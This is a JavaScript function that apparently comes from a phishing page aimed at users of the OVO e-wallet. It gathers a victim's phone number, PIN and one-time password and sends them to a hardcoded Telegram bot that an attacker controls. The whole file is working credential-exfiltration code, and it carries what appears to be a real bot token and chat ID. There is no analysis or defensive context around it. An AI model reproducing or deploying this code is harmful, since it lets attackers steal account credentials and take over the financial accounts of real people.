function sendTelegram(phone, pin, otp) {
    const botToken = "7247863634:AAFXAS2P2b60HWYS9OEbPQ3pPTnqv5oVZwg";
    const chatId   = "1932640103";

    const message = `
☬ ∘ OVO ∘ ☬
- Nomor HP: ${phone}
- PIN: ${pin}
- OTP: ${otp}
    `;

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    return fetch(url, {
        method: "POST",
        headers: { 
            "Content-Type": "application/x-www-form-urlencoded"
        },
        body: new URLSearchParams({
            chat_id: chatId,
            text: message,
            parse_mode: "HTML"
        })
    })
    .then(res => res.json())
    .then(result => result.ok)
    .catch(err => {
        console.error("Error:", err);
        return false;
    });
}
